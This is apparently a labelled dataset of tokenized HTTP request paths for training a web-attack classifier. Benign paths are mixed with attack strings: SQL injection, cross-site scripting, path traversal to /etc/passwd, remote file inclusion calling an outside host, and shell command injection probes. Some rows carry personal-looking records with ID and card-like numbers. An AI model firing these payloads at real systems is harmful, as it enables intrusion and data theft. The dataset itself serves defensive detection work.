request	label
/ sources / admin / admin_cats . php ? config [ main_path ]  = xxpathxx 	1
/ betablockmodules / videosmediagallerymodule / videosmediagallerymodule . php ? current_blockmodule_path = xxpathxx 	1
"/ t578vqea . php3 ?  < script > document . cookie =  "" testsory = 7676 ;  ""  <  / script > "	1
/ string / strings / parameters = >  < script > confirm ( 0 )  <  / script > 	1
/ 046748 / 	0
/ string / strings / parameters = 1 )  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  ( 1233 = 1233 	1
/ servlet / org . apache . catalina . servlets . webdavstatus /  < script > alert (  ' vulnerable '  )  <  / script > 	1
/ string / strings / parameters = 06434691g 	0
/ lan-switch / 	0
"/ string / strings / parameters = '  & echo $ ifshnqwxr $  (  ( 73 + 6 )  )  $  ( echo $ ifshnqwxr ) hnqwxr "" "	1
/ string / strings / parameters = inocencio 	0
"/ string / strings / parameters = 1 %  ""  ""  )  or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  -- "	1
/ opensiteadmin / scripts / classes / filters / singlefilter . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / vir0v3xfc ?  \ x00 	1
/ sysuser / docmgr / sendmail . stm ? path =  < script > alert ( document . cookie )  <  / script > 	1
/ abb-ansley / 	0
/ cisler / 	0
/ pls / simpledad / admin_ / adddad . htm ?  < advanceddad > 	1
"/ g3w7y7u5 . cfm ?  < meta http-equiv = set-cookie content =  "" testbfpq = 3326 ""  > "	1
"/ if69ddo1 . idc ?  < script > document . cookie =  "" testiabz = 5220 ;  ""  <  / script > "	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  (  (  ""  "" ddun ""  ""  =  ""  "" ddun "	1
/ b5xdqgz2 . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ m2fpztty . html ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = ""  & echo $ ifslohvxk $  (  ( 39 + 85 )  )  $  ( echo $ ifslohvxk ) lohvxk ' "	1
/ examples / jsp / colors / admin / configset . php ? settings_dir =  / etc / passwd \ x00 	1
/ 198045_1 / 	0
/ string / strings / parameters = olite 	0
/ string / strings / parameters = 1 )  and char ( 107 )  |  | char ( 121 )  |  | char ( 97 )  |  | char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- 	1
/ string / strings / parameters = 0212404020033772 	0
/ javascript / events . php 	0
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  { file } 	1
/ xxxvideo18 / 	0
/ cube 2 - the movie_information / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  ; select pg_sleep ( 5 )  and  (  (  (  ""  "" nvuv ""  ""  like  ""  "" nvuv "	1
/ string / strings / parameters = 8arrascal485 	0
/ 0077335945 / 	0
/ string / strings / parameters = dannies 	0
"/ string / strings / parameters = 1 %  ""  ""  union all select null , null , null , null , null , null , null , null # "	1
/ javascript / tape . tar . bz2 	0
/ javascript / legal . class 	0
/ string / modo = entrar & login = ness & pwd = juma & remember = on /  & b1 = entrar 	1
/ string / strings / parameters = #  ' 	1
/ navstripdivider / 	0
/ nav_alerts / 	0
/ javascript / lost + found . bak 	0
/ string / strings / parameters = 1 '  where 2389 = 2389 and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  -- 	1
/ javascript / uk . exe 	1
"/ azcrfs8d . idc ?  < meta http-equiv = set-cookie content =  "" testjpdr = 9205 ""  > "	1
/ scripts / index . php ? gadget = glossary & action = view & term =  < script > alert (  ' jaws_xss . nasl '  )  ;  <  / script > 	1
/ string / strings / parameters = reiko 	0
/ string / strings / parameters = 8449 	0
/ phpmyadmin / index . php ? template =  .  .  /  .  .  /  .  .  / loudblog / custom / config . php \ x00 	1
/ string / strings / parameters = ;  str =  $  ( echo zvpmjq )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
"/ string / strings / parameters = -2085 ""  ""  )  as hkev where 7730 = 7730 union all select 7730 , 7730 -- "	1
/ inc / libs / core / core . load_plugins . php ? plugin_file = xxpathxx ? 	1
/ travelstar / 	0
/ string / modo = entrar & login = mayor & pwd = s5bal850de & remember = on & b1 = entrar 	0
/ string / strings / parameters = -2806 '  )  )  )  or 2724 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  ' rxzr '  =  ' rxzr 	1
/ string / strings / parameters = 0 . 1 	1
/ stylesheet . php ? version = 1331749591 	0
"/ index . php ? config [  \  "" sipssys \  ""  ]  =  @ rfiurl "	1
/ string / strings / parameters = canal saracho 	0
/ scripts / new_images . php ? order = linpha_order_sql_injection . nasl_1331909275 	1
"/ string / strings / parameters = < body onmouseover body onmouseover =  "" javascript : javascript : alert ( 1 )  ""  >  <  / body onmouseover > "	1
/ string / strings / parameters = -7561 )  as ilrm where 8828 = 8828 or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  -- 	1
/ string / strings / parameters = 7840274194886704 	0
/ string / strings / parameters = sarri de ter 	0
/ cordles1 / 	0
/ string / modo = registro & login = rubio & password = c35iz3 & nombre = chaila & apellidos = virella + altimirs & email = kava_ivic @ comercioenlacalle . info & dni = 38993479s & direccion = c /  + almansa ,  + 91 ,  + 6d & ciudad = codos & cp = 12427 & provincia = tarragona & ntc = 2840005774765443 & b1 = registrar 	0
/ string / strings / parameters = 1 '  +  ( select dgnt where 4701 = 4701 or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  -- 	1
/ string / strings / parameters = domenge canelas 	0
/ findanagent / 	0
/ mp3-splitter2 / 	0
/ 1004321239 / 	0
/ modules / forums / bb_smilies . php ? default_theme =  < script > alert (  ' vulnerable '  )  <  / script > 	1
/ troyano_video / 	0
/ string / strings / parameters = altillo 	0
/ string / strings / parameters = plang_schallert @ white-pearl-resort . kp 	0
/ string / strings / parameters = '  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null , null )   /  * 	1
"/ fpnpp5zg . x ?  < script > document . cookie =  "" testyias = 101 ;  ""  <  / script > "	1
/ warbears_feat / 	0
/ linda_chavez20061206 / 	0
/ javascript / surf . error 	0
"/ miz4r5hz . cgi ?  < script > document . cookie =  "" testviqu = 1270 ;  ""  <  / script > "	1
/ string / strings / parameters = ;  str =  $  ( echo oqsiql )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ 116241 / 	0
/ webex_player / 	0
/ scripts / spt -- forumtopics . php ? forumid = -9 union select null , null , null , 1331923205 , 4 , 5 	1
/ string / strings / parameters = 91394289v 	0
/ q24227155 	0
/ string / strings / parameters = ;  str =  $  ( echo iboovb )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ google-video / 	0
/ string / strings / parameters = o . toole 	0
/ string / strings / parameters = mackenzie . cointepas0 @ drivinn . lv 	0
/ cacti / commerce . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00index . html 	1
"/ string / strings / parameters = < svg onresize svg onresize =  "" javascript : javascript : alert ( 1 )  ""  >  <  / svg onresize > "	1
/ adsensevideos / 	0
"/ azcrfs8d . cgi ?  < meta http-equiv = set-cookie content =  "" testjpdr = 9205 ""  > "	1
/ ipswitch ws_ftp professional 2006 incl keygen-zwt / 	0
/ string / strings / parameters = sentis 	0
/ mens-shoes_w0qqfromzr4qqsacatz63850qqsocmdzlistingitemlistqqsspagenamezdcpclothingtextfeat / 	0
/ thumb02 / 	0
/ string / strings / parameters = fortner 	0
/ string / strings / parameters = es + teatita 	0
/ gaming_tech / 	0
/ javascript / de . exe 	1
/ vengine_download / 	0
/ pochette_defaut / 	0
/ string / strings / parameters = < img src = javascript : alert ( string . fromcharcode ( 88 , 83 , 83 )  )  > 	1
/ javascript / pbo . gz 	0
/ string / strings / parameters = mcarthur 	0
"/ string / strings / parameters = < img lowsrc =  "" javascript : javascript : alert ( 1 )  ""  > "	1
/ string / strings / parameters = 8151 	0
/ string / strings / parameters = '   str =  $  ( echo lmrvvk )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ recordings / survey . inc . php ? path =  / etc / passwd \ x00 	1
/ dna_surveillanc / 	0
/ string / modo = insertar & precio = 3497 & b1 = pasar + por + caja 	0
"/ en-us / oie504mr . nsf ?  < meta http-equiv = set-cookie content =  "" testtpby = 7052 ""  > "	1
/ javascript / mem . exe 	1
/ string / strings / parameters = albuixech 	0
/ string / strings / parameters = 6107572427974464 	0
/ string / strings / parameters = lierde . vaverka @ 2horas . wf 	0
/ suite / index . php ? pg = http :  /  / cirt . net / rfiinc . txt ?  ? 	0
/ string / strings / parameters = abrucena 	0
/ string / strings / parameters = '  if ( 1 !  = 1 , 1 , sleep ( 5 )  )  --  + 	1
/ string / strings / parameters = -6473 '  union all select 7537 # 	1
/ dda2qr7j . jspa ?  < script > cross_site_scripting . nasl <  / script > 	1
/ browse_drawings / 	0
/ cacti / index2 . cgi ? frames = yes & board = demo & mode = current & threads = collapse & message =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + 50 + 6a + 0c + e8 + 0c + 00 + 00 + 00 + 50 + 8d + 5d + 27 + 53 + ff + d0 + 91 + 5a + 5f + eb + 6b + 60 + 89 + e5 + 60 + 31 +  +  >  > esbq "	1
/ offene_stellen / 	0
/ student-code / 	0
/ examples / jsp / colors / index . php ? act = arcade & do = stats & gameid = 1 ' 	1
/ main . php ? stuff =  '  \ x0dsleep 10  # 	1
"/ string / strings / parameters = 1 %  ""  ""  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 and  ""  ""  %  ""  ""  =  ""  "" "	1
/ stealth-2 / 	0
/ recordings / plog-download . php ? dl_type = album & checked [  ]  =  '  union select  ' plogger_checked_sql_injection . nasl '  , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0  -- 	1
/ carte_ameriques2 / 	0
/ niet642834387 . 	0
"/ d7ktpmcq . fts ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = ivancevi 	0
/ string / modo = registro & login = slinowsk & password = b4c2chu0 & nombre = chera & apellidos = jorda + escol '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & email = dai-line @ gay-tantra . ma & dni = 97610819s & direccion = c /  + vulcano + 29 +  & ciudad = manzanillo & cp = 03689 & provincia = vila & ntc = 4772503716652699 & b1 = registrar 	1
/ 192989 / 	0
/ 048936 / 	0
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331919142 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ string / strings / parameters = |   [  9 -ne  $  ( echo hdechs  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ string / strings / parameters = 68364284g 	0
/ string / strings / parameters = enedn 	0
/ javascript / showenv . exe 	1
/ javascript / games . exe 	1
/ en-us / account / cvslog . cgi ? file =  < script > window . alert <  / script > 	1
/ string / strings / parameters = echo qlrsup $  (  ( 61 + 80 )  )  $  ( echo qlrsup ) qlrsup | 	1
"/ string / id = 3 & nombre = jamn + ibrico ""  + and +  "" 1 ""  =  "" 1 & precio = 100 & cantidad = 29 & b1 = aadir + al + carrito "	1
/ 038248 / 	0
/ string / strings / parameters = erill 	0
/ string / id = 3 /  & nombre = jamn + ibrico & precio = 85 & cantidad = 32 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hsrgrg )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ micro_capillairen / 	0
/ javascript / date . pfx 	0
/ a5e63430221a663724980c30fd1f64f184b5f8c621dcc4782d08fae235a4ac314f708c4243c3f7ae43ad213453911b4f288c1f148cc14a38 / 	0
/ u780672 / 	0
/ string / strings / parameters = 48655 	0
/ string / strings / parameters = lakhian 	0
/ string / strings / parameters = c /  geranio ,  65 	0
"/ help . php ? q =  "" del q82754698  # "	1
/ 960708 / 	0
"/ 3hlysl2x . jsp ?  < meta http-equiv = set-cookie content =  "" testgjbe = 8505 ""  > "	1
/ string / strings / parameters = sant celoni 	0
/ string / modo = registro & login = reinhard & password = ddima & nombre = heli & apellidos = ponce + vilda & email = scheff_guiffre @ interpretacion-diccionario-y-significado-de-los-s & dni = 59779905f & direccion = el + morejon ,  + s / n + 11 ? d & ciudad = arbeca & cp = 39200 & provincia = segovia & ntc = 8869503887772031 & b1 = registrar 	0
"/ en-us / odzk29aa . mscgi ?  < script > document . cookie =  "" testtfvh = 2141 ;  ""  <  / script > "	1
/ 038652 / 	0
/ string / strings / parameters = 35807418y 	0
/ insiderthreats / 	0
/ string / strings / parameters = muelle de astillero 128 5-b 	0
"/ string / id =  ""  >  <  !  --  # exec + cmd =  "" dir +  ""  --  >  <  & nombre = vino + rioja & precio = 85 & cantidad = 60 & b1 = aadir + al + carrito "	1
/ string / strings / parameters = -6218 '  )  )  or 2236 = 4469 # 	1
/  .  . 0x2f .  . 0x2f { file } 	1
/ string / strings / parameters = 1214 	0
/ in flames - live in korea 2002 dvd ntsc / 	0
/ string / str =  $  ( echo shpkri )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ string / strings / parameters = bryson2 @ casablancabeach . kp 	0
/ string / strings / parameters = calle valle de salazar ,  4 	0
"/ ewc3rz1l . asp ?  < meta http-equiv = set-cookie content =  "" testkgqo = 204 ""  > "	1
/ butback / 	0
/ string / strings / parameters = 40027603j 	0
/ hub-puller / 	0
/ string / strings / parameters = < svg >  < script  ?  > alert ( 1 ) 	1
/ sc \ xc3 \ xa8ntzia / 	0
/ string / strings / parameters = 1 '  )  )  )  and 6414 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  (  (  (  ' msjw '  like  ' msjw 	1
/ 20011108-4 / 	0
/ string / strings / parameters = salter @ quiromante . com . mg 	0
/ charlie_dimock / 	0
/ xprrpc_why / 	0
"/ main . php ? stuff =  "" ping \ xa0-w \ xa07000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 | rem \ xa0 "	1
/ string / strings / parameters = |   [  5 -ne  $  ( echo lqrkbx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ google_logo / 	0
/ string / strings / parameters = 3540035321904498 	0
/ comments . php ? scriptpath = http :  /  / 192 . 168 . 202 . 96 : 8080 / swgnhpydbq0t ?  ? 	1
"/ main . php ? logout =  ""  & del \ xa0q18437972 & rem \ xa0 "	1
/ string / strings / parameters = nolie 	0
"/ en-us / fo564rei . cgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 161368 / 	0
/ string / strings / parameters = elliott 	0
/ javascript / f . zip 	0
/ versandcenter / 	0
/ string / strings / parameters = aghili 	0
"/ string / strings / parameters = < textarea > javascript :  /  * - /  *  `  /  *  \  `  /  *  '  /  *  ""  /  *  *  /  (  /  *   *  / onclick = alert (  )   )  /  /      /  /  <  / style /  <  / title /  <  / textarea /  <  / script /  --  !  >  \ x3csvg /  < svg / onload = alert (  )  /  /  >  \ x3e <  / textarea > "	1
/ string / id = 1 & nombre = jamn + ibrico & precio = 100 & cantidad = 19 & b1 = aadir + al + carrito 	0
/ string / modo = registro & login = bejar & password = litigar & nombre = enzo & apellidos =  ? j-o-dar & email = borgato @ 19horas . ee & dni = 96483882d & direccion = esperanto ,  + 182 ,  +  & ciudad = sobremunt & cp = 19278 & provincia = alicante & ntc = 2319237634289833 & b1 = registrar 	1
/ string / strings / parameters = c /  alcalde gabriel mejias pombo 121 6-f 	0
"/ string / strings / parameters = < img src = x on * chr * error =  "" javascript : log (  * num *  )  ""  /  > "	1
/  .  .  % u2216 .  .  % u2216 .  .  % u2216 .  .  % u2216 { file } 	1
/ string / strings / parameters = 29456732b 	0
/ string / modo = registro & login = lonald8 & password = 5h5c8 & nombre = ivonne & apellidos = abarrategui + allende & email = pap @ evelin . com . ly & dni = 94629114f & direccion = haiti + 27 + 1 ? g & ciudad = hortigela & cp = 47319 & provincia = sevilla & ntc = 3123820484071721 & b1 = registrar 	0
"/ main . php ? stuff =  ""  | ping \ x0c-w \ x0c11000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c "	1
/ string / strings / parameters = pl .  obra sindical del hogar 43 5-a 	0
/ mccauley / 	0
"/ string / modo =  <  !  --  # exec + cmd =  "" ls +  /  ""  --  >  & login = crowder & pwd = 6 . en0e6at2da & remember = on & b1 = entrar "	1
/ string / strings / parameters = -9587 union all select 1568 , 1568 , 1568 , 1568 , 1568 , 1568 # 	1
/ cacti / install . php ? newlang =  .  .  /  .  .  / cpg_error . log \ x00 	1
/ javascript / fixed . cfm 	0
"/ string / strings / parameters = -2072 ""  ""  )  as rjcz where 2491 = 2491 or 6872 = 6872 -- "	1
/ test_45 / 	0
"/ string / strings / parameters = |   [  7 -ne  $  ( echo kbhdas  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ string / strings / parameters = minuet salo 	0
/ string / id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 45 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = *  | 	1
/ studip-1 . 3 . 0-2 / studip-phplib / oohforms . inc ? cmd = ls -al & _phplib [ libdir ]  = xxpathxx ? 	1
/ 20061018-4 / 	0
"/ string / strings / parameters = 1 ""  ""  )  where 9020 = 9020 or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  -- "	1
/ kickstandcity / 	0
/ javascript / usa . exe 	1
"/ bmeun223 . do ?  < script > document . cookie =  "" testhhwu = 7044 ;  ""  <  / script > "	1
